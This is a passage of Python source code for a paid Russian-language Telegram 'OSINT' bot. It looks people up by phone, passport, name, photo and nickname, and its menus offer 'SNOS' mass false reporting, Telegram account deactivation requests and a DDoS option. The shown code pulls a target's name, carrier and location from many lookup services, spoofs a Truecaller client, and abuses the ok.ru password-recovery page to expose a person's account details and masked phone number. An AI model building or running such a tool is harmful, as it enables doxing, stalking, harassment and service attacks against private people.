    uid = str(getattr(user_or_id, "id", user_or_id))
    owner_id = get_admin_id()
    if owner_id and str(owner_id) == uid:
        return True
    rec = vip_users.get(uid)
    if not rec:
        return False
    until = rec.get("until", 0)
    if until == -1:
        return True
    return until > time.time()


def has_free_lookup(user_or_id):
    uid = str(getattr(user_or_id, "id", user_or_id))
    rec = known_users.get(uid, {})
    return not rec.get("free_lookup_used", False)


def consume_free_lookup(user_or_id):
    uid = str(getattr(user_or_id, "id", user_or_id))
    if uid not in known_users:
        return False
    if known_users[uid].get("free_lookup_used", False):
        return False
    known_users[uid]["free_lookup_used"] = True
    known_users[uid]["free_lookup_used_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    save_users()
    return True


def vip_until_text(user_or_id):
    uid = str(getattr(user_or_id, "id", user_or_id))
    rec = vip_users.get(uid)
    if not rec:
        return "—"
    until = rec.get("until", 0)
    if until == -1:
        return "бессрочно"
    return datetime.fromtimestamp(until).strftime("%Y-%m-%d %H:%M")


def grant_vip(user_id, days, granted_by="system"):
    uid = str(user_id)
    now = time.time()
    rec = vip_users.get(uid, {"since": now, "until": 0, "granted_by": granted_by})
    if days == -1:
        rec["until"] = -1
    else:
        base = rec.get("until", 0)
        if base == -1:
            base = now
        if base < now:
            base = now
        rec["until"] = base + days * 86400
    rec["granted_by"] = granted_by
    rec["since"] = rec.get("since", now)
    vip_users[uid] = rec
    save_vip()
    return rec


def revoke_vip(user_id):
    uid = str(user_id)
    if uid in vip_users:
        del vip_users[uid]
        save_vip()
        return True
    return False


def ensure_owner_vip():
    owner_id = get_admin_id()
    if owner_id:
        grant_vip(owner_id, -1, granted_by="owner-auto")
        log(f"[VIP] Владельцу @{OWNER_USERNAME} выдан бессрочный VIP")


def register_user(user, action=None):
    uid = str(user.id)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    is_new = uid not in known_users
    if is_new:
        known_users[uid] = {
            "username": user.username or "",
            "first_name": user.first_name or "",
            "last_name": user.last_name or "",
            "registered": now, "actions": 0, "last_seen": now,
            "free_lookup_used": False,
        }
    else:
        known_users[uid]["username"] = user.username or known_users[uid].get("username", "")
        known_users[uid]["first_name"] = user.first_name or known_users[uid].get("first_name", "")
        known_users[uid]["last_name"] = user.last_name or known_users[uid].get("last_name", "")
        known_users[uid]["last_seen"] = now
    if action:
        known_users[uid]["actions"] = known_users[uid].get("actions", 0) + 1
    save_users()
    if user.username and user.username.lower() == ADMIN_USERNAME.lower():
        _admin_id_cache["id"] = user.id
        if not has_vip(user):
            grant_vip(user.id, -1, granted_by="owner-auto")
    if is_new and not is_admin(user):
        notify_admin(
            f"🆕 <b>Новый пользователь</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"<b>ID:</b> <code>{user.id}</code>\n"
            f"<b>Username:</b> @{user.username or '—'}\n"
            f"<b>Имя:</b> {user.first_name or '—'} {user.last_name or ''}\n"
            f"<b>Время:</b> {now}"
        )
    if action and not is_admin(user):
        notify_admin(
            f"🔔 <b>Действие пользователя</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"<b>ID:</b> <code>{user.id}</code>\n"
            f"<b>Username:</b> @{user.username or '—'}\n"
            f"<b>Действие:</b> {action}\n"
            f"<b>Время:</b> {now}"
        )

# ================== PDF ==================
def register_font():
    possible_fonts = [
        "C:/Windows/Fonts/arial.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
        "/System/Library/Fonts/Supplemental/Arial.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf",
    ]
    for path in possible_fonts:
        if os.path.exists(path):
            try:
                pdfmetrics.registerFont(TTFont("CyrFont", path))
                return "CyrFont"
            except Exception:
                continue
    return "Helvetica"


PDF_FONT = register_font()

DARK_BLUE   = colors.HexColor("#8b0000")
MID_BLUE    = colors.HexColor("#b22222")
LIGHT_BLUE  = colors.HexColor("#fff0f0")
LIGHT_BLUE2 = colors.HexColor("#ffe0e0")
SNOW_WHITE  = colors.HexColor("#ffffff")
SNOW_SOFT   = colors.HexColor("#ffcccc")
ACCENT      = colors.HexColor("#dc143c")


def draw_background(canvas, doc):
    width, height = A4
    steps = 60
    for i in range(steps):
        t = i / steps
        r = (0x8b + (0xdc - 0x8b) * t) / 255
        g = (0x00 + (0x14 - 0x00) * t) / 255
        b = (0x00 + (0x3c - 0x00) * t) / 255
        canvas.setFillColorRGB(r, g, b)
        canvas.rect(0, height - (i + 1) * (height / steps),
                    width, height / steps + 1, stroke=0, fill=1)

    rng = random.Random(2024 + doc.page * 7)
    canvas.saveState()
    for _ in range(60):
        x = rng.uniform(0, width)
        y = rng.uniform(0, height)
        size = rng.uniform(2.5, 9.0)
        alpha = rng.uniform(0.25, 0.85)
        canvas.setFillColor(SNOW_WHITE, alpha=alpha)
        canvas.setStrokeColor(SNOW_WHITE, alpha=alpha)
        canvas.setLineWidth(0.4)
        for k in range(6):
            ang = math.radians(k * 60)
            dx = math.cos(ang) * size
            dy = math.sin(ang) * size
            canvas.line(x, y, x + dx, y + dy)
            bx = x + dx * 0.55
            by = y + dy * 0.55
            for side in (-1, 1):
                ang2 = ang + side * math.radians(45)
                canvas.line(
                    bx, by,
                    bx + math.cos(ang2) * size * 0.35,
                    by + math.sin(ang2) * size * 0.35,
                )
        canvas.circle(x, y, 0.9, stroke=0, fill=1)
    canvas.restoreState()


def safe_text(text):
    text = re.sub(r"<[^>]+>", "", str(text))
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def generate_pdf(report, filepath):
    doc = BaseDocTemplate(
        filepath, pagesize=A4,
        leftMargin=1.5 * cm, rightMargin=1.5 * cm,
        topMargin=1.8 * cm, bottomMargin=1.5 * cm,
        title=report.get("title", "OSINT Report"),
        author="OSINT Telegram Bot",
    )
    frame = Frame(
        doc.leftMargin, doc.bottomMargin,
        doc.width, doc.height, id="main",
        showBoundary=0,
    )
    doc.addPageTemplates([
        PageTemplate(id="Snowy", frames=[frame], onPage=draw_background)
    ])

    styles = getSampleStyleSheet()
    title_style = ParagraphStyle(
        "TitleSnow", parent=styles["Title"], fontName=PDF_FONT,
        fontSize=20, textColor=colors.HexColor("#8b0000"), alignment=1,
        spaceAfter=10, leading=24,
    )
    h_style = ParagraphStyle(
        "HSnow", parent=styles["Heading2"], fontName=PDF_FONT,
        fontSize=13, textColor=colors.HexColor("#dc143c"),
        spaceBefore=10, spaceAfter=6,
    )
    body_style = ParagraphStyle(
        "BodySnow", parent=styles["Normal"], fontName=PDF_FONT,
        fontSize=10, leading=14, textColor=colors.HexColor("#8b0000"),
    )
    body_dark = ParagraphStyle(
        "BodyDark", parent=body_style, textColor=colors.HexColor("#8b0000"),
    )
    note_style = ParagraphStyle(
        "NoteSnow", parent=body_style, textColor=colors.HexColor("#b22222"),
        fontName=PDF_FONT, fontSize=9,
    )
    footer_style = ParagraphStyle(
        "FooterSnow", parent=body_style, alignment=1,
        textColor=colors.HexColor("#b22222"), fontSize=9,
    )

    story = [Paragraph(safe_text(report["title"]), title_style), Spacer(1, 0.4 * cm)]

    for section in report["sections"]:
        if section.get("heading"):
            story.append(Paragraph(safe_text(section["heading"]), h_style))
        items = section.get("items", [])
        if items:
            table_data = [[
                Paragraph(f"<b>{safe_text(k)}</b>", body_dark),
                Paragraph(safe_text(v), body_dark),
            ] for k, v in items]
            table = Table(table_data, colWidths=[4.5 * cm, 12 * cm])
            table.setStyle(TableStyle([
                ("GRID", (0, 0), (-1, -1), 1.2, colors.HexColor("#dc143c")),
                ("BOX", (0, 0), (-1, -1), 1.6, colors.HexColor("#8b0000")),
                ("VALIGN", (0, 0), (-1, -1), "TOP"),
                ("BACKGROUND", (0, 0), (-1, -1), colors.HexColor("#ffffff")),
                ("BACKGROUND", (0, 0), (0, -1), colors.HexColor("#ffe0e0")),
                ("LEFTPADDING", (0, 0), (-1, -1), 6),
                ("RIGHTPADDING", (0, 0), (-1, -1), 6),
                ("TOPPADDING", (0, 0), (-1, -1), 5),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
            ]))
            story.append(table)
            story.append(Spacer(1, 0.25 * cm))
        for line in section.get("lines", []):
            story.append(Paragraph(f"• {safe_text(line)}", body_style))
        for note in section.get("notes", []):
            story.append(Paragraph(f"<i>{safe_text(note)}</i>", note_style))
        story.append(Spacer(1, 0.3 * cm))

    story.append(Spacer(1, 0.5 * cm))
    story.append(Paragraph("❄ Отчёт сгенерирован OSINT-ботом ❄", footer_style))
    doc.build(story)


def generate_xml(report, filepath):
    root = ET.Element("osint_report")
    ET.SubElement(root, "title").text = safe_text(report["title"])
    ET.SubElement(root, "generated_by").text = "OSINT Telegram Bot"
    sections_el = ET.SubElement(root, "sections")
    for section in report["sections"]:
        sec = ET.SubElement(sections_el, "section")
        if section.get("heading"):
            ET.SubElement(sec, "heading").text = safe_text(section["heading"])
        items_el = ET.SubElement(sec, "items")
        for key, value in section.get("items", []):
            item = ET.SubElement(items_el, "item")
            ET.SubElement(item, "key").text = safe_text(key)
            ET.SubElement(item, "value").text = safe_text(value)
        for line in section.get("lines", []):
            ET.SubElement(sec, "line").text = safe_text(line)
        for note in section.get("notes", []):
            ET.SubElement(sec, "note").text = safe_text(note)
    xml_str = ET.tostring(root, encoding="utf-8")
    pretty = minidom.parseString(xml_str).toprettyxml(indent="  ", encoding="utf-8")
    with open(filepath, "wb") as f:
        f.write(pretty)


# ================== КЛАВИАТУРЫ ==================
def main_menu(user=None):
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("🟦 📞 По номеру", callback_data="menu_phone"),
        types.InlineKeyboardButton("🟦 📧 По Email", callback_data="menu_email"),
    )
    kb.add(
        types.InlineKeyboardButton("🟦 🌐 По IP", callback_data="menu_ip"),
        types.InlineKeyboardButton("🟦 👤 По ФИО", callback_data="menu_name"),
    )
    kb.add(
        types.InlineKeyboardButton("🟦 🌍 По сайту", callback_data="menu_site"),
        types.InlineKeyboardButton("🟦 🏠 По кадастру", callback_data="menu_kadastr"),
    )
    kb.add(
        types.InlineKeyboardButton("🟦 📍 По координатам", callback_data="menu_coords"),
        types.InlineKeyboardButton("🟦 📱 Telegram OSINT", callback_data="menu_tg"),
    )
    kb.add(
        types.InlineKeyboardButton("🟦 🆔 По паспорту", callback_data="menu_passport"),
        types.InlineKeyboardButton("🟦 👥 Одноклассники", callback_data="menu_ok"),
    )
    kb.add(types.InlineKeyboardButton("🟦 🖼️ По фото", callback_data="menu_photo"))
    kb.add(types.InlineKeyboardButton("🟦 🕵️ По никнейму (Sherlock)", callback_data="menu_sherlock"))
    kb.add(types.InlineKeyboardButton("🟦 🔗 VK по ссылке", callback_data="menu_vk"))
    kb.add(types.InlineKeyboardButton("🟦 🗄️ Локальные БД", callback_data="menu_db"))
    kb.add(types.InlineKeyboardButton("🟦 📨 SNOS", callback_data="snos_menu"))
    kb.add(types.InlineKeyboardButton("🟦 💣 DDoS", callback_data="ddos_menu"))
    kb.add(types.InlineKeyboardButton("🟦 📡 Мониторинг", callback_data="menu_monitor"))
    kb.add(types.InlineKeyboardButton("🟦 💎 VIP-доступ", callback_data="vip_menu"))
    kb.add(
        types.InlineKeyboardButton("🟦 ℹ️ Помощь", callback_data="menu_help"),
        types.InlineKeyboardButton("🟦 👑 О нас", callback_data="menu_about"),
    )
    if user and is_admin(user):
        kb.add(types.InlineKeyboardButton("🟦 🛡️ Админ-панель", callback_data="admin_panel"))
        if is_maintenance():
            kb.add(types.InlineKeyboardButton(
                "🟦 ▶️ Возобновить работу", callback_data="maintenance_off"))
        else:
            kb.add(types.InlineKeyboardButton(
                "🟦 ⏸️ Технический перерыв", callback_data="maintenance_on"))
    return kb


def back_menu():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ В меню", callback_data="menu_main"))
    return kb


def result_menu(has_report=True):
    kb = types.InlineKeyboardMarkup(row_width=2)
    if has_report:
        kb.add(
            types.InlineKeyboardButton("🟦 📄 PDF", callback_data="save_pdf"),
            types.InlineKeyboardButton("🟦 📋 XML", callback_data="save_xml"),
        )
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ В меню", callback_data="menu_main"))
    return kb


def monitor_menu():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🟦 ➕ Добавить сайт", callback_data="monitor_add"))
    kb.add(types.InlineKeyboardButton("🟦 📋 Мой список", callback_data="monitor_list"))
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ В меню", callback_data="menu_main"))
    return kb


def admin_menu():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🟦 🚫 Заблокировать пользователя", callback_data="admin_block"))
    kb.add(types.InlineKeyboardButton("🟦 ✅ Разблокировать пользователя", callback_data="admin_unblock"))
    kb.add(types.InlineKeyboardButton("🟦 📋 Список заблокированных", callback_data="admin_list"))
    kb.add(types.InlineKeyboardButton("🟦 👥 Пользователи", callback_data="admin_users"))
    kb.add(types.InlineKeyboardButton("🟦 📊 Статистика", callback_data="admin_stats"))
    kb.add(types.InlineKeyboardButton("🟦 ♻️ Перезагрузить БД", callback_data="admin_reloaddb"))
    kb.add(types.InlineKeyboardButton("🟦 🛡️ Управление VIP", callback_data="vip_admin"))
    kb.add(types.InlineKeyboardButton("🟦 ⚙️ Настройки SNOS", callback_data="snos_settings"))
    kb.add(types.InlineKeyboardButton("🟦 🌐 SNOS WEB настройки", callback_data="snos_web_settings"))
    kb.add(types.InlineKeyboardButton("🟦 📣 Рассылка всем", callback_data="owner_broadcast"))
    if is_maintenance():
        kb.add(types.InlineKeyboardButton("🟦 ▶️ Возобновить работу", callback_data="maintenance_off"))
    else:
        kb.add(types.InlineKeyboardButton("🟦 ⏸️ Технический перерыв", callback_data="maintenance_on"))
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ В меню", callback_data="menu_main"))
    return kb


def vip_menu(user=None):
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton("🟦 💎 Купить VIP", callback_data="vip_buy"))
    kb.add(types.InlineKeyboardButton("🟦 📅 Мой статус", callback_data="vip_status"))
    kb.add(types.InlineKeyboardButton("🟦 📜 Что даёт VIP", callback_data="vip_rules"))
    if user and (is_admin(user) or is_owner(user)):
        kb.add(types.InlineKeyboardButton("🟦 🛡️ Управление VIP", callback_data="vip_admin"))
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ В меню", callback_data="menu_main"))
    return kb


def vip_buy_menu():
    kb = types.InlineKeyboardMarkup(row_width=2)
    for key, item in vip_prices.items():
        kb.add(types.InlineKeyboardButton(
            f"🟦 {item['label']} — {item['price']}₽",
            callback_data=f"vip_buy:{key}"
        ))
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ Назад", callback_data="vip_menu"))
    return kb


def vip_admin_menu():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🟦 ➕ Выдать VIP", callback_data="vip_grant"))
    kb.add(types.InlineKeyboardButton("🟦 ➖ Снять VIP", callback_data="vip_revoke"))
    kb.add(types.InlineKeyboardButton("🟦 📋 Список VIP", callback_data="vip_list"))
    kb.add(types.InlineKeyboardButton("🟦 💰 Заявки на оплату", callback_data="vip_orders"))
    kb.add(types.InlineKeyboardButton("🟦 ⚙️ Реквизиты (рубли)", callback_data="vip_edit_pay"))
    kb.add(types.InlineKeyboardButton("🟦 ⚙️ Реквизиты (NFT)", callback_data="vip_edit_nft"))
    kb.add(types.InlineKeyboardButton("🟦 ⚙️ Реквизиты (крипта)", callback_data="vip_edit_crypto"))
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ Назад", callback_data="vip_menu"))
    return kb


def snos_menu():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🟦 🌐 SNOS WEB (прямые запросы)", callback_data="snos_web_menu"))
    kb.add(types.InlineKeyboardButton("🟦 📧 SNOS через почты (старый)", callback_data="snos_mail_menu"))
    kb.add(types.InlineKeyboardButton("🟦 ⚙️ Настройки SNOS", callback_data="snos_settings"))
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ В меню", callback_data="menu_main"))
    return kb


def snos_mail_menu():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🟦 👤 Жалоба на аккаунт", callback_data="snos_account"))
    kb.add(types.InlineKeyboardButton("🟦 📢 Жалоба на канал", callback_data="snos_channel"))
    kb.add(types.InlineKeyboardButton("🟦 🤖 Жалоба на бота", callback_data="snos_bot"))
    kb.add(types.InlineKeyboardButton("🟦 ⚙️ Настройки SNOS", callback_data="snos_settings"))
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ Назад", callback_data="snos_menu"))
    return kb


def snos_web_menu():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🟦 🌐 Жалоба (support, без почты)", callback_data="snos_web_support_form"))
    kb.add(types.InlineKeyboardButton("🟦 💀 Деактивация (my.telegram.org)", callback_data="snos_web_deact_form"))
    kb.add(types.InlineKeyboardButton("🟦 ⚙️ Настройки", callback_data="snos_web_settings"))
    kb.add(types.InlineKeyboardButton("🟦 📊 Статистика WEB", callback_data="snos_web_stats"))
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ Назад", callback_data="snos_menu"))
    return kb


def snos_account_menu():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🟦 🚫 Спам", callback_data="snos_acc:spam"))
    kb.add(types.InlineKeyboardButton("🟦 🕵️ Доксинг", callback_data="snos_acc:doxing"))
    kb.add(types.InlineKeyboardButton("🟦 🤬 Троллинг", callback_data="snos_acc:trolling"))
    kb.add(types.InlineKeyboardButton("🟦 🔑 Снос сессий", callback_data="snos_acc:sessions"))
    kb.add(types.InlineKeyboardButton("🟦 💎 Спам с Premium", callback_data="snos_acc:premium_spam"))
    kb.add(types.InlineKeyboardButton("🟦 📱 Виртуальный номер", callback_data="snos_acc:virtual_number"))
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ Назад", callback_data="snos_mail_menu"))
    return kb


def snos_channel_menu():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🟦 🧾 Личные данные", callback_data="snos_ch:personal_data"))
    kb.add(types.InlineKeyboardButton("🟦 🐾 Живодёрство", callback_data="snos_ch:animal_cruelty"))
    kb.add(types.InlineKeyboardButton("🟦 ⚠️ ЦП", callback_data="snos_ch:cp"))
    kb.add(types.InlineKeyboardButton("🟦 💰 Каналы-прайсы (доксинг)", callback_data="snos_ch:doxing_services"))
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ Назад", callback_data="snos_mail_menu"))
    return kb


def snos_settings_menu():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🟦 ➕ Добавить отправителя", callback_data="snos_add_sender"))
    kb.add(types.InlineKeyboardButton("🟦 📋 Список отправителей", callback_data="snos_list_senders"))
    kb.add(types.InlineKeyboardButton("🟦 ➕ Добавить получателя", callback_data="snos_add_receiver"))
    kb.add(types.InlineKeyboardButton("🟦 📋 Список получателей", callback_data="snos_list_receivers"))
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ Назад", callback_data="snos_menu"))
    return kb


# ================== УТИЛИТЫ ==================
def normalize_phone(phone):
    if not phone:
        return ""
    digits = re.sub(r"\D", "", str(phone))
    if len(digits) == 11 and digits.startswith("8"):
        digits = "7" + digits[1:]
    elif len(digits) == 10:
        digits = "7" + digits
    return digits


def sort_address(address):
    address_order = [
        "country", "state", "region", "county", "city",
        "town", "village", "suburb", "road",
        "house_number", "postcode",
    ]
    return {k: address[k] for k in address_order if k in address}


def translate_address(address):
    translations = {
        "country": "Страна", "state": "Область", "region": "Регион",
        "county": "Район области", "city": "Город", "town": "Городок",
        "village": "Деревня", "suburb": "Район", "road": "Улица",
        "house_number": "Номер дома", "postcode": "Почтовый индекс",
    }
    return {translations.get(k, k.capitalize()): v for k, v in address.items()}


def get_address_by_coordinates(latitude, longitude):
    url = (f"https://nominatim.openstreetmap.org/reverse?"
           f"format=json&lat={latitude}&lon={longitude}&accept-language=ru")
    try:
        req = urllib.request.Request(url, headers={
            "User-Agent": "OSINTBot/1.0 (contact: bot@example.com)"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.load(resp)
        if "address" in data:
            return sort_address(data["address"]), data.get("display_name", "")
        return None, "Адрес не найден"
    except Exception as e:
        return None, f"Ошибка: {str(e)[:60]}"


def check_access(message, require_vip=True):
    if is_blocked(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Доступ к боту запрещён администратором.")
        return False
    if is_maintenance() and not is_admin(message.from_user):
        bot.send_message(message.chat.id, MAINTENANCE_TEXT, parse_mode="HTML")
        return False
    if require_vip and not has_vip(message.from_user):
        show_vip_wall(message.chat.id, message.from_user)
        return False
    return True


def check_access_or_free(message):
    if is_blocked(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Доступ к боту запрещён администратором.")
        return False, False
    if is_maintenance() and not is_admin(message.from_user):
        bot.send_message(message.chat.id, MAINTENANCE_TEXT, parse_mode="HTML")
        return False, False
    if has_vip(message.from_user) or is_admin(message.from_user):
        return True, False
    if has_free_lookup(message.from_user):
        if consume_free_lookup(message.from_user):
            bot.send_message(
                message.chat.id,
                "🎁 <b>Бесплатный пробный пробив активирован!</b>\n"
                "Осталась 1 попытка. Следующие запросы — только с VIP.",
                parse_mode="HTML",
            )
            return True, True
    show_vip_wall(message.chat.id, message.from_user)
    return False, False


def show_vip_wall(chat_id, user):
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🟦 💎 Купить VIP", callback_data="vip_buy"))
    kb.add(types.InlineKeyboardButton("🟦 📅 Мой статус", callback_data="vip_status"))
    kb.add(types.InlineKeyboardButton("🟦 📜 Что даёт VIP", callback_data="vip_rules"))
    if is_admin(user):
        kb.add(types.InlineKeyboardButton("🟦 🛡️ Управление VIP", callback_data="vip_admin"))
    bot.send_message(
        chat_id,
        "🔒 <b>Доступ только для VIP-пользователей</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "Бесплатный пробный пробив уже использован.\n\n"
        "Чтобы продолжить пользоваться функциями бота, оформите VIP-подписку.\n\n"
        "Нажмите «💎 Купить VIP», чтобы посмотреть тарифы.",
        parse_mode="HTML",
        reply_markup=kb,
    )


def check_htmlweb_phone(phone):
    try:
        headers = {"User-Agent": random.choice(OK_USERAGENTS)}
        r = requests.get(HTMLWEB_URL + phone, headers=headers, timeout=10)
        if r.status_code != 200:
            return {}
        data = r.json()
        result = {}
        result["telcod"] = data.get("country", {}).get("telcod")
        result["country"] = data.get("country", {}).get("fullname")
        result["okrug"] = data.get("okrug")
        result["region"] = data.get("region", {}).get("name")
        result["city"] = data.get("0", {}).get("name")
        result["latitude"] = data.get("0", {}).get("latitude")
        result["longitude"] = data.get("0", {}).get("longitude")
        result["timezone"] = data.get("0", {}).get("time_zone", data.get("time_zone"))
        result["oper"] = data.get("0", {}).get("oper")
        return {k: v for k, v in result.items() if v not in (None, "", "Неизвестно")}
    except Exception:
        return {}


def check_veriphone(phone):
    try:
        headers = {"User-Agent": random.choice(OK_USERAGENTS)}
        r = requests.get(f"{VERIPHONE_URL}{phone}&key={VERIPHONE_API_KEY}",
                         headers=headers, timeout=10)
        if r.status_code != 200:
            return {}
        data = r.json()
        return {
            "phone_type": data.get("phone_type"),
            "carrier": data.get("carrier"),
            "region": data.get("region"),
            "country": data.get("country"),
            "e164": data.get("e164"),
        }
    except Exception:
        return {}


def check_ok_login(telcode):
    OK_LOGIN_URL = 'https://www.ok.ru/dk?st.cmd=anonymMain&st.accRecovery=on&st.error=errors.password.wrong'
    OK_RECOVER_URL = 'https://www.ok.ru/dk?st.cmd=anonymRecoveryAfterFailedLogin&st._aid=LeftColumn_Login_ForgotPassword'
    headers = {"User-Agent": random.choice(OK_USERAGENTS)}
    try:
        session = requests.Session()
        session.get(f'{OK_LOGIN_URL}&st.email={telcode}', timeout=10)
        request = session.get(OK_RECOVER_URL, timeout=10)
        soup = BeautifulSoup(request.content, 'html.parser')
        if soup.find('div', {'data-l': 'registrationContainer,offer_contact_rest'}):
            info = {}
            acc = soup.find('div', {'class': 'ext-registration_tx taCenter'})
            masked = soup.find('button', {'data-l': 't,phone'})
            info["Привязанный номер"] = masked.get_text(strip=True) if masked else telcode
            if acc:
                name = acc.find('div', {'class': 'ext-registration_username_header'})
                info["Имя аккаунта"] = name.get_text(strip=True) if name else "—"
                rows = acc.find_all('div', {'class': 'lstp-t'})
                if len(rows) >= 2:
                    info["Инфо профиля"] = rows[0].get_text(strip=True)
                    info["Дата регистрации"] = rows[1].get_text(strip=True)
            return info
        if soup.find('div', {'data-l': 'registrationContainer,home_rest'}):
            return None
    except Exception:
        return None
    return None

# ================== LIVE API ==================
def check_numverify(phone):
    if not NUMVERIFY_KEY:
        return {}
    try:
        r = requests.get(NUMVERIFY_URL,
                         params={"access_key": NUMVERIFY_KEY, "number": phone, "format": 1},
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("valid"):
                return {k: data.get(k) for k in
                        ("valid", "local_format", "international_format", "country_prefix",
                         "country_code", "country_name", "location", "carrier", "line_type")}
    except Exception:
        pass
    return {}


def check_abstractapi(phone):
    if not ABSTRACTAPI_KEY:
        return {}
    try:
        r = requests.get(ABSTRACTAPI_URL,
                         params={"api_key": ABSTRACTAPI_KEY, "phone": phone}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("valid"):
                return {
                    "valid": data.get("valid"),
                    "format_international": data.get("format", {}).get("international"),
                    "format_local": data.get("format", {}).get("local"),
                    "country_name": data.get("country", {}).get("name"),
                    "country_code": data.get("country", {}).get("code"),
                    "location": data.get("location"),
                    "carrier": data.get("carrier"),
                    "type": data.get("type"),
                }
    except Exception:
        pass
    return {}


def check_ipqs(phone):
    if not IPQS_KEY:
        return {}
    try:
        r = requests.get(f"{IPQS_URL}{IPQS_KEY}/{phone}", timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("success"):
                return {k: data.get(k) for k in
                        ("valid", "active", "fraud_score", "recent_abuse", "voip",
                         "prepaid", "risky", "carrier", "line_type", "country",
                         "city", "zip_code", "region", "dialing_code", "timezone")}
    except Exception:
        pass
    return {}


def check_eyecon(phone):
    try:
        r = requests.post(EYECON_URL,
                          json={"phone": phone, "country": "RU"},
                          headers={"User-Agent": random.choice(OK_USERAGENTS),
                                   "Content-Type": "application/json"},
                          timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("name") or data.get("photo"):
                return {"name": data.get("name"), "photo": data.get("photo"),
                        "carrier": data.get("carrier")}
    except Exception:
        pass
    return {}


def check_syncme(phone):
    try:
        r = requests.get(SYNCME_URL, params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("name"):
                return {"name": data.get("name"), "carrier": data.get("carrier"),
                        "country": data.get("country")}
    except Exception:
        pass
    return {}


def check_truecaller(phone):
    try:
        headers = {
            "User-Agent": "Truecaller/12.20.6 (Android; 10)",
            "Accept": "application/json",
            "Content-Type": "application/json",
        }
        r = requests.get(TRUECALLER_URL,
                         params={"q": phone, "countryCode": "RU", "type": 4, "encoding": "json"},
                         headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("data"):
                rec = data["data"][0]
                return {"name": rec.get("name"), "carrier": rec.get("carrier"),
                        "country": rec.get("countryCode"), "spam": rec.get("spam"),
                        "tags": rec.get("tags")}
    except Exception:
        pass
    return {}


def check_getcontact_live(phone):
    try:
        r = requests.get(f"{GETCONTACT_LIVE_URL}{phone}",
                         headers={"User-Agent": random.choice(OK_USERAGENTS)}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("tags"):
                return {"tags": data.get("tags"), "name": data.get("name")}
    except Exception:
        pass
    return {}


def check_telegram_phone(phone):
    try:
        r = requests.get(TELEGRAM_PHONE_URL.format(phone=phone.lstrip("+")),
                         headers={"User-Agent": random.choice(OK_USERAGENTS)},
                         timeout=10, allow_redirects=True)
        if "tgme_page_title" in r.text:
            soup = BeautifulSoup(r.text, "html.parser")
            title = soup.find("div", {"class": "tgme_page_title"})
            extra = soup.find("div", {"class": "tgme_page_extra"})
            return {"registered": True,
                    "title": title.get_text(strip=True) if title else "—",
                    "extra": extra.get_text(strip=True) if extra else "—"}
        return {"registered": False}
    except Exception:
        return {}


def check_whatsapp(phone):
    try:
        r = requests.get(WHATSAPP_URL.format(phone=phone.lstrip("+")),
                         headers={"User-Agent": random.choice(OK_USERAGENTS)},
                         timeout=10, allow_redirects=True)
        if "wa.me" in r.url or "api.whatsapp.com" in r.url:
            return {"registered": True}
        return {"registered": False}
    except Exception:
        return {}


def check_viber(phone):
    try:
        r = requests.get(VIBER_URL.format(phone=phone.lstrip("+")),
                         headers={"User-Agent": random.choice(OK_USERAGENTS)},
                         timeout=10, allow_redirects=True)
        if r.status_code == 200 and "viber" in r.text.lower():
            return {"registered": True}
        return {"registered": False}
    except Exception:
        return {}


def check_mnp(phone):
    try:
        r = requests.get(f"https://api.mnp.help/v1/check?phone={phone}",
                         headers={"User-Agent": random.choice(OK_USERAGENTS)}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {"mnp": data.get("mnp"), "operator": data.get("operator")}
    except Exception:
        pass
    return {}


def check_hlr(phone):
    try:
        r = requests.get(f"https://api.hlrlookup.com/api/v1/hlr?phone={phone}",
                         headers={"User-Agent": random.choice(OK_USERAGENTS)}, timeout=10)
